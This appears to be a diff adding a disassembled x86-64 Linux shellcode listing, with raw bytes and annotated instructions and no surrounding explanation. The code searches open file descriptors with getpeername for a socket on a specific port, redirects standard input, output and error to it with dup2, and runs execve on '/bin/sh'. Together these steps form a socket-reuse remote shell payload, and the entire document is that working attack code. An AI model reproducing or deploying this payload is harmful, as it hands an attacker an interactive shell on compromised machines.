@@ -1,0 +1,33 @@
+    0x00  4831ff         xor rdi, rdi                                                                                                                      
+    0x03  4831db         xor rbx, rbx                                                                                                                      
+    0x06  b314           mov bl, 0x14                ; 20                                                                                                  
+    0x08  4829dc         sub rsp, rbx                                                                                                                      
+    0x0b  488d1424       lea rdx, [rsp]                                                                                                                    
+    0x0f  488d742404     lea rsi, [rsp + 4]          ; 4                                                                                                   
+┌─> 0x14  6a34           push 0x34                   ; '4' ; 52                                                                                            
+╎   0x16  58             pop rax                                                                                                                           
+╎   0x17  0f05           syscall                                                                                                                           
+╎   0x19  48ffc7         inc rdi                                                                                                                           
+╎   0x1c  66817e021341   cmp word [rsi + 2], 0x4113  ; [0x2:2]=0x48ff ; 16659                                                                              
+└─< 0x22  75f0           jne 0x14                                                                                                                          
+    0x24  48ffcf         dec rdi                                                                                                                           
+    0x27  6a02           push 2                      ; 2                                                                                                   
+    0x29  5e             pop rsi                                                                                                                           
+┌─> 0x2a  6a21           push 0x21                   ; '!' ; 33                                                                                            
+╎   0x2c  58             pop rax                                                                                                                           
+╎   0x2d  0f05           syscall                                                                                                                           
+╎   0x2f  48ffce         dec rsi                                                                                                                           
+└─< 0x32  79f6           jns 0x2a                                                                                                                          
+    0x34  4889f3         mov rbx, rsi                                                                                                                      
+    0x37  bb412f7368     mov ebx, 0x68732f41         ; 'A/sh'                                                                                              
+    0x3c  b82f62696e     mov eax, 0x6e69622f         ; '/bin'                                                                                              
+    0x41  48c1eb08       shr rbx, 8                                                                                                                        
+    0x45  48c1e320       shl rbx, 0x20                                                                                                                     
+    0x49  4809d8         or rax, rbx                                                                                                                       
+    0x4c  50             push rax                                                                                                                          
+    0x4d  4889e7         mov rdi, rsp                                                                                                                      
+    0x50  4831f6         xor rsi, rsi
+    0x53  4889f2         mov rdx, rsi
+    0x56  6a3b           push 0x3b                   ; ';' ; 59
+    0x58  58             pop rax
+    0x59  0f05           syscall
